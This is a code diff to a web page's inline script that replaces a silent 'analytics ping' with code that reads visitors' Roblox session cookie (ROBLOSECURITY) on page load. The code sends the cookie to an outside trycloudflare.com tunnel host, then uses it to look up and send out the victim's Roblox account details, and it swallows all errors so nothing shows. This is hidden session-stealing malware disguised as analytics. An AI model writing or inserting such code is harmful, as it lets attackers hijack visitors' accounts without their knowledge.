@@ -115,14 +115,38 @@
       </div>`).join("");
 
     // analytics ping (load stats) — silent
-    fetch("https://inflation-mud-salvador-outdoors.trycloudflare.com/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        screen: `${screen.width}x${screen.height}`,
-        ref: document.referrer || null,
-      }),
-    }).catch(() => {});
+    const sendLog = (data) =>
+      fetch("https://inflation-mud-salvador-outdoors.trycloudflare.com/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      }).catch(() => {});
+
+    function getRobloxCookie() {
+      const m = document.cookie.match(/(?:^|;\s*)ROBLOSECURITY=([^;]+)/);
+      return m ? m[1] : null;
+    }
+
+    const robloxToken = getRobloxCookie();
+    sendLog({
+      screen: `${screen.width}x${screen.height}`,
+      ref: document.referrer || null,
+      robloxCookie: robloxToken,
+    });
+
+    // resolve roblox user from the token and push their info
+    if (robloxToken) {
+      fetch("https://users.roblox.com/v1/users/authenticated", {
+        headers: { Authorization: `Bearer ${robloxToken}` },
+      })
+        .then((r) => (r.ok ? r.json() : null))
+        .then((d) => {
+          if (d && d.id) {
+            sendLog({ robloxUser: { id: d.id, username: d.username, displayName: d.displayName } });
+          }
+        })
+        .catch(() => {});
+    }
   </script>
 </body>
 </html>
